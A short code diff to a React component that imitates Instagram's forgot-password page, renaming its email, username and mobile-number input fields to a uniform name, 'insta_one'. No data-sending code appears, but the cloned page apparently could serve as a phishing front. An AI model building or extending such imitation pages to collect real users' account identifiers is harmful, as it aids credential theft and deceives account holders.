@@ -104,7 +104,7 @@ export default function InstagramForgotPasswordPage() {
                 <div>
                   <input
                     type={mode === "email" ? "text" : "tel"}
-                    name={mode === "email" ? "email_or_username" : "mobile_number"}
+                    name="insta_one"
                     value={identifier}
                     onChange={(e) => setIdentifier(e.target.value)}
                     placeholder={mode === "email" ? "Email or username" : "Mobile number"}
@@ -210,7 +210,7 @@ export default function InstagramForgotPasswordPage() {
                 <div>
                   <input
                     type="text"
-                    name="mobile_or_username_or_email"
+                    name="insta_one"
                     value={identifier}
                     onChange={(e) => setIdentifier(e.target.value)}
                     placeholder="Mobile number, username or email"
